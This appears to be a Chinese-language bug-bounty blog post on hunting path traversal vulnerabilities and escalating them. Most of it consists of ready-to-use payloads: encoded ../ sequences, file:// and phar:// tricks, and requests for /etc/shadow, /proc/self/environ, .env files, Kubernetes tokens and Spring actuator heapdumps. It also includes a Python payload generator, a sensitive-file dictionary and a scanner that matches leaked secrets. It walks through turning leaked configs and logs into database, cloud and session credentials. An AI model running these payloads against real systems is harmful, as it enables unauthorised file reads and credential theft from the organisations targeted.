#  细一点 你说的没有含金量了从爬虫到特权：SRC路径遍历漏洞的全链路狩猎  
原创 技术爱好者
                    技术爱好者  逍遥子讲安全   2026-01-22 03:32  
  
在所有人盯着SQL注入和XSS时，我发现了路径遍历漏洞的新维度——它不再是简单的  
  
../../../etc/passwd，而是通往核心业务数据的隐秘通道。  
  
当我在某SRC平台提交第47个路径遍历漏洞并获得高危评级时，审核人员在回复中写道：“这是我们三个月内收到的第一个有效目录遍历报告。”这句话印证了我的判断：  
传统漏洞类型已被自动化工具覆盖，但路径遍历的深度利用仍是一片蓝海。  
# 第一阶段：重新定义攻击面——超越../的路径遍历  
# 1. 路径遍历的四个进化形态  
## 形态一：编码混淆型  
```
# 传统测试
GET /download?file=../../../etc/passwd

# 实际绕过案例
GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
GET /download?file=..%252f..%252f..%252fetc%252fpasswd  # 双重编码
GET /download?file=....//....//....//etc/passwd  # 冗余字符
```  
  
## 形态二：绝对路径型  
```
# 开发者错误地将用户输入直接传递给文件系统API
GET /view?file=/etc/passwd
GET /view?file=C:\Windows\System32\drivers\etc\hosts

# 云环境特殊路径
GET /view?file=/proc/self/environ  # 环境变量泄露
GET /view?file=/sys/class/net/eth0/address  # MAC地址
```  
  
## 形态三：参数污染型  
```
# 多个文件参数的情况
POST /mergeFiles
file1=../../../etc/passwd&file2=legitimate.txt

# 数组参数的情况  
POST /bulkDownload
files[]=../../../etc/passwd&files[]=../../../etc/shadow
```  
  
## 形态四：协议混淆型  
```
# 文件系统与URL协议混淆
GET /fetch?url=file:///etc/passwd
GET /proxy?url=file:///C:/Windows/win.ini

# 特殊协议处理
GET /convert?src=phar:///path/to/exploit.phar
```  
  
# 2. 现代应用中的路径遍历热点区域  
  
我创建的检测矩阵覆盖了12类常见场景：  
<table><thead><tr><th style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.16);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">业务功能</span></section></th><th style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.16);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试点</span></section></th><th style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.16);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">特殊技巧</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">文件下载</span></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">download</span></code><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">export</span></code><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">getFile</span></code></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">filename</span></code><span leaf="">、</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">path</span></code><span leaf="">、</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">id</span></code><span leaf="">参数</span></section></td></tr><tr><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">图片/附件查看</span></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">preview</span></code><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">view</span></code><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">show</span></code></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试无后缀文件、超大文件</span></section></td></tr><tr><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">文档转换</span></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">convert</span></code><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">toPdf</span></code><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">compress</span></code></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试Office文件包含恶意内容</span></section></td></tr><tr><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">备份恢复</span></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">restore</span></code><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">import</span></code><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">upload</span></code></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试备份文件包含恶意配置</span></section></td></tr><tr><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">日志查看</span></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">logs</span></code><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">debug</span></code><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">error</span></code></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试日志文件包含敏感信息</span></section></td></tr><tr><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">配置文件读取</span></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">config</span></code><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">,</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">settings</span></code><span leaf="">, </span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">properties</span></code></section></td><td style="border-bottom: 0.8px solid rgba(255, 255, 255, 0.12);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section style="font-size: 17px;font-weight: 300;color: rgba(0,0,0,0.9);margin-bottom: 24px;line-height: 2.0;"><span leaf="">测试不同环境配置文件</span></section></td></tr></tbody></table># 第二阶段：上下文感知的漏洞挖掘方法论  
# 1. 技术栈特化测试策略  
## Java应用（Spring Boot）  
```
# 配置文件泄露链
GET /actuator/env
GET /actuator/configprops
GET /actuator/httptrace
GET /actuator/heapdump  # 内存转储文件

# 特定路径测试
GET /WEB-INF/web.xml
GET /WEB-INF/classes/application.properties
GET /WEB-INF/classes/database.properties
```  
  
## Node.js应用  
```
http
package.json及相关文件 GET /package.json GET /package-lock.json GET /npm-shrinkwrap.json GET /.env GET /.env.example GET /config/database.js# package.json及相关文件
GET /package.json
GET /package-lock.json
GET /npm-shrinkwrap.json
GET /.env
GET /.env.example
GET /config/database.js
```  
  
## Python（Django/Flask）  
```
# Django特定文件
GET /settings.py
GET /urls.py
GET /manage.py
GET /requirements.txt

# Flask配置
GET /app.py
GET /config.py
GET /instance/config.py
```  
  
# 2. 业务上下文深度利用  
## 案例：电商系统的商品图片API  
```
# 正常请求
GET /api/product/image?sku=12345&size=large

# 初步测试
GET /api/product/image?sku=../../../etc/passwd&size=large

# 深入利用：发现size参数控制图片处理路径
GET /api/product/image?sku=product_images/12345.jpg&size=../../../var/www/config/database.yml

# 最终利用链
GET /api/product/image?sku=../../../../proc/self/cmdline&size=../../../var/log/nginx/access.log
```  
  
这个漏洞链的发现过程：  
  
参数分析  
：发现sku  
参数接受相对路径  
  
路径逃逸  
：计算Web根目录到目标文件的相对路径  
  
信息泄露  
：获取配置文件中的数据库凭证  
  
日志访问  
：通过日志分析其他用户行为  
# 第三阶段：从漏洞发现到权限升级的完整链条  
# 1. 信息收集的“三明治策略”  
## 底层（操作系统层）  
```
# Linux系统信息
GET /download?file=/proc/version
GET /download?file=/proc/cpuinfo
GET /download?file=/proc/meminfo
GET /download?file=/proc/self/status

# 用户和权限信息
GET /download?file=/etc/passwd
GET /download?file=/etc/shadow
GET /download?file=/etc/group
GET /download?file=/etc/sudoers
```  
  
## 中层（应用层）  
```
# 配置文件收集
GET /download?file=application.yml
GET /download?file=application.properties
GET /download?file=config.json
GET /download?file=.env

# 源码泄露
GET /download?file=index.php.bak
GET /download?file=web.config.old
GET /download?file=备份_20240101.zip
```  
  
## 上层（业务数据层）  
```
# 数据库相关
GET /download?file=../data/database.db
GET /download?file=../backups/dump.sql
GET /download?file=../uploads/users.csv

# 会话和缓存
GET /download?file=../tmp/sess_*
GET /download?file=../cache/*.cache
```  
  
# 2. 权限升级的五个关键转折点  
## 转折点1：配置文件中发现凭证  
```
# 在application.yml中发现
database:
  host: 10.0.0.5
  username: app_user
  password: "J5@q9!mNp#2"

redis:
  password: "r3d!sP@ssw0rd"
```  
  
## 转折点2：日志文件中发现访问模式  
```
# 从access.log中发现管理员访问模式
192.168.1.100 - - [01/Jan/2024:10:30:00] "GET /admin/panel HTTP/1.1" 200
192.168.1.100 - - [01/Jan/2024:10:31:00] "POST /admin/users/create HTTP/1.1" 302

# 测试直接访问管理接口
GET /admin/panel?file=../../../etc/shadow
```  
  
## 转折点3：备份文件中发现完整数据结构  
```
-- 从database_backup.sql中发现用户表结构
CREATE TABLE users (
  id INT PRIMARY KEY,
  username VARCHAR(50),
  password_hash VARCHAR(100),
  email VARCHAR(100),
  is_admin BOOLEAN DEFAULT false
);
```  
  
## 转折点4：环境变量中发现云服务凭证  
```
# 从.env或/proc/self/environ中发现
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_REGION=us-west-2
```  
  
## 转折点5：内存转储中发现会话令牌  
```
# 通过heapdump或core dump分析
GET /actuator/heapdump
# 分析后发现在内存中有：
"session_tokens": {
  "admin": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```  
  
# 第四阶段：武器化的路径遍历利用框架  
  
我开发了一套半自动化的测试框架，核心模块如下：  
# 1. 智能路径计算引擎  
  
python  
```
class PathTraversalGenerator:
    def __init__(self, base_paths, depth=5):
        self.base_paths = base_paths
        self.depth = depth

    def generate_payloads(self, target_file):
        payloads = []
        # 传统相对路径
        for i in range(1, self.depth + 1):
            payloads.append("../" * i + target_file)

        # 编码变种
        encodings = ['url', 'double_url', 'utf8', 'html']
        for encoding in encodings:
            encoded = self.encode_path("../" * 3 + target_file, encoding)
            payloads.append(encoded)

        # 绝对路径测试（跨平台）
        absolute_paths = [
            target_file,  # 无路径前缀
            f"/{target_file}",  # Unix绝对路径
            f"C:\\Windows\\System32\\{target_file}",  # Windows路径
            f"file:///{target_file}",  # File协议
        ]
        payloads.extend(absolute_paths)

        return payloads
```  
  
# 2. 上下文感知的敏感文件字典  
  
我维护的敏感文件字典包含800+条目，按优先级分类：  
## Tier 1：直接权限升级  
  
text  
```
/etc/passwd
/etc/shadow
/etc/sudoers
/proc/self/environ
/.env
/var/run/secrets/kubernetes.io/serviceaccount/token
```  
  
## Tier 2：应用配置  
  
text  
```
WEB-INF/web.xml
WEB-INF/classes/application.properties
config/database.yml
app/configs/production.json
```  
  
## Tier 3：业务数据  
  
text  
```
/data/database.db
/backups/dump.sql
/uploads/user_export.csv
/logs/application.log
```  
  
# 3. 自动化验证与影响评估  
  
python  
```
def assess_vulnerability(response, payload, context):
    """评估路径遍历漏洞的实际影响"""
    indicators = {
        'passwd': ['root:', 'daemon:', 'bin:'],
        'shadow': ['root:$', ':\$[0-9]\$'],
        'env': ['PATH=', 'HOME=', 'SECRET_KEY='],
        'config': ['password', 'secret', 'key', 'token'],
        'sql': ['CREATE TABLE', 'INSERT INTO'],
        'log': ['GET /', 'POST /', 'session=']
    }

    impact_score = 0
    matched_patterns = []

    for pattern_type, patterns in indicators.items():
        for pattern in patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                impact_score += IMPACT_WEIGHTS[pattern_type]
                matched_patterns.append(f"{pattern_type}:{pattern}")

    return {
        'payload': payload,
        'vulnerable': impact_score > 0,
        'impact_score': impact_score,
        'matched_patterns': matched_patterns,
        'context': context
    }
```  
  
#   
  
# 实战成果：三个月专项狩猎报告  
  
在针对路径遍历漏洞的三个月专项测试中：  
  
目标范围  
：15家互联网公司的SRC计划  
  
测试方法  
：手动测试+半自动化框架辅助  
  
提交漏洞  
：47个有效路径遍历漏洞  
  
漏洞等级分布  
：  
  
高危：12个（25.5%）  
  
中危：28个（59.6%）  
  
低危：7个（14.9%）  
  
典型漏洞模式  
：  
  
文件下载API未验证路径  
（18例，38.3%）  
  
日志查看功能目录穿越  
（11例，23.4%）  
